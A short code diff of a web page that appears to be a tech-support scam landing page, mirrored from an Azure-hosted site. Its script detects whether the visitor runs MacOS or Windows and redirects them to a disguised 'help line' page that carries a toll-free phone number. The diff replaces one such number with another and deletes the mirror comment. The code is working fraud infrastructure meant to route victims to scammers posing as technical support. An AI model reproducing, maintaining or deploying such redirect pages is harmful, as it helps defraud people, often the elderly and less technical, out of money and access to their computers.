@@ -32,9 +32,9 @@
         let operatingSystem = myOperatingSystem();
         localStorage.setItem('alpha',getQueryParam('alpha'));
         if(operatingSystem === 'MacOS'){
-            window.location.href="Mac0helpS0h0line67/index.php?bcda=1-800-654-0175 ";
+            window.location.href="Mac0helpS0h0line67/index.php?bcda=1-844-478-1428 ";
         }else{
-            window.location.href="Win0helpS0h0line67/index.php?bcda=1-800-654-0175 ";
+            window.location.href="Win0helpS0h0line67/index.php?bcda=1-844-478-1428 ";
         }
 
 
@@ -45,5 +45,4 @@
 
 </body>
 
-<!-- Mirrored from bigdellsc.z13.web.core.windows.net/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 17 Dec 2024 18:34:58 GMT -->
 </html>
